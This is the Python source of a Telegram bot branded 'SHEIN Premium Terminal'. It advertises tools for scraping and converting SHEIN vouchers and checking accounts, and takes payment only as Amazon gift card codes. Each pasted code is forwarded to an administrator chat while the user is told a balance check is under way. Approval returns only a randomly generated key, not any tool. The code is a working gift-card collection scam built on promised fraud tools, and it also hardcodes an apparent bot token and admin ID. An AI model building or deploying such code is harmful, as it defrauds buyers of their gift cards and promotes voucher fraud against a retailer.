import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import json
import os
import secrets
import time

# --- CONFIGURATION ---
TOKEN = '8491708232:AAGQSQjgkQw2td_g5AW2awt9TH1tfxBTpN4' #
bot = telebot.TeleBot(TOKEN)

ADMIN_ID = "1964960018" #
SUPPORT_USERNAME = "@aloklootoffer" 
DB_FILE = "users_db.json" 

# Services & Pricing
SERVICES = {
    "scraper": {"name": "🕵️ Scraper Pro", "price": 400},
    "num_to_vouch": {"name": "🔢 Num > Voucher", "price": 270},
    "checker": {"name": "⚖️ Account Checker", "price": 250},
    "protector": {"name": "🛡️ Guard System", "price": 300},
    "lifetime": {"name": "👑 Full Lifetime", "price": 1000}
}

# --- DATABASE ---
def load_db():
    if not os.path.exists(DB_FILE): return {} #
    with open(DB_FILE, "r") as f:
        try: return json.load(f)
        except: return {}

def save_db(db):
    with open(DB_FILE, "w") as f:
        json.dump(db, f, indent=4) #

# --- BOOT ANIMATION ---
def fast_boot(chat_id):
    msg = bot.send_message(chat_id, "🌑 `System Offline`")
    frames = ["🌘 `Syncing Database...`", "🌗 `Establishing SSL...`", "🌕 `Terminal Online!`"]
    for frame in frames:
        time.sleep(0.5)
        bot.edit_message_text(frame, chat_id, msg.message_id)
    time.sleep(0.3)
    bot.delete_message(chat_id, msg.message_id)

# --- KEYBOARDS ---
def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🛍️ SHOP TOOLS", "🎒 MY STUFF")
    markup.row("📖 USER GUIDE", "🆘 SUPPORT")
    return markup

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.chat.id)
    db = load_db()
    if uid not in db:
        db[uid] = {"name": message.from_user.first_name, "tools": [], "pending": None}
        save_db(db)
    
    fast_boot(message.chat.id)
    
    welcome = (f"🛰 **Welcome, {message.from_user.first_name}!**\n\n"
               "The SHEIN Premium Terminal is now linked to your ID.\n"
               "Experience the most advanced automation tools with ease.")
    bot.send_message(message.chat.id, welcome, reply_markup=main_menu(), parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📖 USER GUIDE")
def show_guide(message):
    guide_text = (
        "📘 **PREMIUM TERMINAL GUIDE**\n\n"
        "**1. How to Buy Tools?**\n"
        "Go to 🛍️ SHOP TOOLS, pick a module, and send the Amazon Gift Card code as a text message.\n\n"
        "**2. What is 'Scraper Pro'?**\n"
        "Extracts hidden vouchers from the SHEIN mainframe automatically.\n\n"
        "**3. What is 'Num > Voucher'?**\n"
        "Converts any registered SHEIN number into a spendable voucher.\n\n"
        "**4. Where are my tools?**\n"
        "Once approved by the Admin, your tools and Access Keys appear in 🎒 MY STUFF.\n\n"
        "**5. Why Amazon Vouchers?**\n"
        "It is the fastest and most secure way to process payments without a bank account."
    )
    bot.send_message(message.chat.id, guide_text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "🛍️ SHOP TOOLS")
def show_shop(message):
    markup = InlineKeyboardMarkup()
    for key, data in SERVICES.items():
        markup.add(InlineKeyboardButton(f"{data['name']} — ₹{data['price']}", callback_data=f"buy_{key}"))
    bot.send_message(message.chat.id, "🛒 **Select a tool to purchase:**", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_"))
def handle_buy(call):
    key = call.data.split("_")[1]
    tool = SERVICES[key]
    db = load_db()
    db[str(call.message.chat.id)]["pending"] = tool['name']
    save_db(db)

    pay_msg = (f"💳 **INVOICE: {tool['name']}**\n\n"
               f"**Total Amount:** ₹{tool['price']}\n"
               "**Payment:** Amazon Gift Card 🎫\n\n"
               "👉 **Instructions:**\n"
               "1. Purchase an Amazon card of this value.\n"
               "2. Paste the **14/15-digit code** here.\n"
               "3. Admin will verify it within minutes!")
    bot.edit_message_text(pay_msg, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and len(m.text) >= 10)
def handle_code(message):
    uid = str(message.chat.id)
    db = load_db()
    pending = db.get(uid, {}).get("pending")

    if pending:
        code = message.text.strip().upper()
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("✅ Approve", callback_data=f"app_{uid}_{pending.replace(' ', '_')}"))
        markup.add(InlineKeyboardButton("❌ Reject", callback_data=f"rej_{uid}"))
        
        # Admin gets tap-to-copy code
        bot.send_message(ADMIN_ID, f"🔔 **NEW VOUCHER**\n👤 User: `{uid}`\n🛠 Tool: {pending}\n🔑 Code: `{code}`", reply_markup=markup, parse_mode="Markdown")
        
        bot.reply_to(message, "📡 **Voucher Logged.**\n\nChecking balance on Amazon... You will be notified the moment access is granted! 🕒")
        db[uid]["pending"] = None
        save_db(db)

@bot.callback_query_handler(func=lambda c: c.data.startswith(("app_", "rej_")))
def admin_process(call):
    if str(call.message.chat.id) != ADMIN_ID: return #
    action, uid, tool_name = call.data.split("_")[0], call.data.split("_")[1], call.data.split("_")[2].replace("_", " ")
    db = load_db()

    if action == "app":
        key = f"KEY-{secrets.token_hex(3).upper()}" #
        if "tools" not in db[uid]: db[uid]["tools"] = []
        db[uid]["tools"].append(f"{tool_name} (Key: {key})")
        save_db(db)
        bot.send_message(uid, f"🎉 **Access Granted!**\n\nModule: {tool_name}\n🔑 Key: `{key}`\nCheck **🎒 MY STUFF**.")
        bot.answer_callback_query(call.id, "Approved!")
    else:
        bot.send_message(uid, "❌ **Voucher Failed.**\n\nThe code was invalid or used. Contact support for help.")
        bot.answer_callback_query(call.id, "Rejected.")

@bot.message_handler(func=lambda m: m.text == "🎒 MY STUFF")
def my_inventory(message):
    db = load_db()
    tools = db.get(str(message.chat.id), {}).get("tools", [])
    if not tools:
        bot.send_message(message.chat.id, "🎒 **Inventory Empty.**\n\nPurchased modules will be stored here.")
    else:
        bot.send_message(message.chat.id, "🎒 **Your Premium Assets:**\n\n" + "\n".join([f"• {t}" for t in tools]))

@bot.message_handler(func=lambda m: m.text == "🆘 SUPPORT")
def support_info(message):
    bot.send_message(message.chat.id, f"🆘 **Need Help?**\n\nContact Admin: {SUPPORT_USERNAME}\nTerminal ID: `{message.chat.id}`")

print("SHEIN Hub v3.1: ONLINE")
bot.infinity_polling()